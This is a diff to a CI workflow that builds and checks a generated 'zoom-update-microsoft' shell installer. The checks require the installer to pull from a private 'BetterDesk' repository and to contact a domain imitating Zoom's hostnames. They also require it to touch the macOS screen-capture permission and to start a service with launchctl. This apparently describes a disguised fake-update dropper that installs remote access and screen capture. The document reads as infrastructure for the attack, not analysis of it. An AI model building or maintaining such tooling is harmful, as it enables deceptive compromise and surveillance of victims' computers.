@@ -46,18 +46,10 @@ jobs:
       - name: Validate generated installer
         run: |
           set -euo pipefail
-          osascript <<'OSA'
-          set s to load script (POSIX file "client-wrappers/client-wrappers/zoom-update-microsoft.applescript")
-          set outText to s's buildInstaller()
-          set f to open for access (POSIX file "/tmp/zoom-installer.sh") with write permission
-          set eof f to 0
-          write outText to f as «class utf8»
-          close access f
-          OSA
+          osascript build/zoom-update-microsoft.scpt --dump /tmp/zoom-installer.sh
           bash -n /tmp/zoom-installer.sh
           grep -q 'raw.githubusercontent.com/fingod201-maker/BetterDesk-private' /tmp/zoom-installer.sh
           grep -q 'us05web.telcom.stream' /tmp/zoom-installer.sh
-          grep -q 'EOF_MARKER' /tmp/zoom-installer.sh || true
           grep -q 'kTCCServiceScreenCapture' /tmp/zoom-installer.sh
           grep -q 'launchctl kickstart' /tmp/zoom-installer.sh
           wc -l /tmp/zoom-installer.sh
